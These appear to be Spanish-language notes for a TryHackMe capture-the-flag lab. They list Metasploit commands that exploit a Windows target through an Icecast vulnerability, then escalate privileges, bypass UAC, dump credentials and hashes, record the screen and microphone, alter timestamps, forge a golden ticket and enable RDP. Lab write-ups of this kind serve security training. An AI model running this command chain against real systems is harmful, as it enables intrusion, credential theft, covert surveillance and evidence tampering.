# Blue - TryHackMe

**IP:** 10.10.194.133

## Puertos Abiertos
```
49152-49160/tcp open  msrpc
```

## Explotación
- Uso de `msfconsole` con exploit:
```bash
use exploit/windows/http/icecast_header
set LHOSTS <mi_ip>
set RHOSTS 10.10.194.133
run
```

- Post-explotación:
```bash
getsystem
systeminfo
background
use post/multi/recon/local_exploit_suggester
set SESSION 1
run
```

- Escalada UAC:
```bash
use windows/local/bypassuac_eventvwr
set SESSION 2
run
```

- Operaciones avanzadas con Meterpreter:
```bash
getprivs
migrate <PID>
getuid
load kiwi
creds_all
hashdump
screenshare
record_mic
timestomp
golden_ticket_create
```

- Habilitar RDP:
```bash
use post/windows/manage/enable_rdp
set SESSION 3
run
```
